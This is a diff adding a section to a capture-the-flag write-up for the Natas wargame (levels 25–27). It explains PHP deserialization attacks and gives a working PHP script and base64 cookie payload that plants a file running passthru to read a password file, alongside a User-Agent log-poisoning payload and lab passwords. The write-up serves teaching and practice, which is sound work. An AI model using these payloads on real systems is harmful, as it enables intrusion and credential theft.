@@ -681,3 +681,48 @@ User-Agent: <?php echo passthru("cat /etc/natas_webpass/natas26"); ?>
 By setting the `User-Agent` in our request as this command, we are `command injecting`, practically tricking the server to execute the `cat` command on the password file and include it inside the log it writes. Because we use `'....//'` to see the logs file, the server writes a new log to that file while using the command we injected as `User-Agent`, and we can see the password.
 
 Password: `cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE`
+
+## Level 26 → 27
+In this level, we have inputs for 2 points (x, y) and the website draws a line between them. Inside the source code, we can see some interesting things. First, there is a class called `Logger` that writes logs into a file. It uses functions like `__constract()` and `__destruct()`. We can also see this code:
+```php
+
+if (array_key_exists("drawing", $_COOKIE)){
+    $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+}
+```
+This is a vulnerability we can use.
+
+### PHP Serialization
+`Serialization` is a way to turn complex data (like arrays or objects) into a string, so it can be stored in files, sessions, or cookies — and later be reconstructed using `unserialize()`. To explain the format, we can look at the following example.
+```
+profile=O:4:"User":1:{s:4:"name";s:5:"admin";}
+```
+`0` means it's an object, and `4` means the object's name has 4 characters. `"User"` is the name of the object, and `1` means it has one property. Inside `{...}` is the object's property map. `s:4:"name"` - `s` means the property is a `string`, it's name has `4` characters and it's name is `"name"`. `s:5:"admin"` - the value is a `string` of `5` characters - `"admin"`.
+
+### PHP Deserializiation Attack
+A `PHP deserialization attack` happens when an application takes user-controlled input and passes it into `PHP`’s `unserialize()` function. This can be dangerous, because serialized data can contain PHP objects, and when they're deserialized, their `magic methods` (like `__wakeup()`, `__destruct()`, or `__toString()`) can be triggered — potentially running malicious code or causing logic flaws. If the application has classes that do interesting things in those `magic methods` (like writing to files, deleting files, executing commands), an attacker can craft a fake serialized object and trigger those behaviors without permission. We should never use `unserialize()` on user inputs, it is safer to use `json_encode()` and `json_decode()` instead.
+
+From the code and explanations above, to use this vulnerability we have to construct a malicious object that overrrides the `Logger` class's `__contruct()`, serialize (and in this case also `base64_encode`) it, and pass it in the `drawing` attribute inside our cookie. Then a log file will be created and we will be able to access the password through it. In order to do so, we make the following file:
+```php
+<?php
+class Logger{
+	private $logFile;
+	private $exitMsg;
+
+	function __construct(){
+		$this->logFile = "./img/filename.php";
+		$this->exitMsg = "<?php echo passthru('cat /etc/natas_webpass/natas27') ?>";
+	}
+}
+
+$logger = new Logger();
+echo base64_encode(serialize($logger))
+?>
+```
+We make a new `Logger` instance of our own, overriding the server's `$logFile` to a file we can access, and `$exitMsg` similarly to the previous level with a `command injection` to print the password file. This is the output:
+```
+Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxODoiLi9pbWcvZmlsZW5hbWUucGhwIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTY6Ijw/cGhwIGVjaG8gcGFzc3RocnUoJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpID8+Ijt9
+```
+Using `Burp`, we set the cookie `drawing` property to the output we got and send a request. When it is received by the server, it `base64_decode`s and `deserialize`s it, and sets `$drawing` as the object we created. At the end of the run, `__destruct()` is called with the malicious `$logFile` and `$exitMsg` we injected, and write it into the file. Then, we visit the path `/img/filename.php` and we can see the password.
+
+Password: `u3RRffXjysjgwFU6b9xa23i6prmUsYne`
